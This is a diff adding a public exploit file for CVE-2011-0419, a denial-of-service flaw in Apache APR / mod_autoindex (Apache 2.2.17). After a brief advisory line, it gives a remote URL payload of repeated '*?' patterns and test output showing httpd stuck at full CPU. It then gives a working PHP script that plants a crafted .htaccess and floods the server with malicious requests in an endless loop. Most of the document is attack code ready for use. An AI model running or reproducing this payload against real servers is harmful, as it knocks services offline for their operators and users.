@@ -1,0 +1,77 @@
+source: http://www.securityfocus.com/bid/47820/info
+
+Apache APR is prone to a vulnerability that may allow attackers to cause a denial-of-service condition.
+
+Apache APR versions prior to 1.4.4 are vulnerable. 
+
+<?php
+/*
+Apache 2.2.17 mod_autoindex local/remote Denial of Service
+author: Maksymilian Arciemowicz
+
+CVE: CVE-2011-0419
+CWE: CWE-399
+
+REMOTE
+Find some directory with supported mod_autoindex on the server. The directory should contain long filenames.
+
+http://[server]/[directory_with_mod_autoindex]/?P=*?*?*?[to 4k]
+
+LOCAL
+Tested on:
+127# httpd -v && uname -a 
+Server version: Apache/2.2.17 (Unix)
+Server built:   Dec 28 2010 13:21:44
+NetBSD localhost 5.1 NetBSD 5.1 (GENERIC) #0: Sun Nov  7 14:39:56 UTC 2010  builds@b6.netbsd.org:/home/builds/ab/netbsd-5-1-RELEASE/i386/201011061943Z-obj/home/builds/ab/netbsd-5-1-RELEASE/src/sys/arch/i386/compile/GENERIC i386
+
+Result:
+127# ls -la   
+total 8
+drwxrwxrwx  2 root  wheel   512 Feb  8 21:41 .
+drwxr-xr-x  7 www   wheel  1024 Jan 31 08:49 ..
+-rw-r--r--  1 www   wheel  1056 Feb  8 19:39 .htaccess
+-rw-r--r--  1 www   wheel     0 Feb  8 19:39 cx.............................................................................................................................
+-rw-r--r--  1 www   wheel  1240 Feb  8 19:42 run.php
+127# ps -aux -p 617 
+USER PID %CPU %MEM   VSZ  RSS TTY STAT STARTED      TIME COMMAND
+www  617 98.6  0.4 10028 4004 ?   R     7:38PM 121:43.17 /usr/pkg/sbin/httpd -k start 
+
+Time = 121:43 and counting
+
+where http://[$localhost]:[$localport]/[$localuri]
+*/
+$localhost="localhost";
+$localport=80;
+$localuri="/koniec/";
+
+
+if(!is_writable(".")) die("!writable");
+
+// Phase 1
+// Create some filename
+touch("cx".str_repeat(".",125));
+
+// Phase 2
+// Create .htaccess with 
+unlink("./.htaccess");
+$htaccess=fopen("./.htaccess", "a");
+fwrite($htaccess,"AddDescription \"CVE-2011-0419\" ".str_repeat('*.',512)."\n");
+fclose($htaccess);
+
+// Phase 3
+// Local connect (bypass firewall restriction)
+while(1){
+	$fp = fsockopen($localhost, $localport, $errno, $errstr, 30);
+	if (!$fp) echo "$errstr ($errno)<br />\n";
+	else {
+		$out = "GET ".$localuri."/?P=".str_repeat("*?",1500)."* HTTP/1.1\r\n";
+		$out .= "Host: ".$localhost."\r\n";
+		$out .= "Connection: Close\r\n\r\n";
+		fwrite($fp, $out);
+		fclose($fp);
+	}
+}
+
+?>
+
+
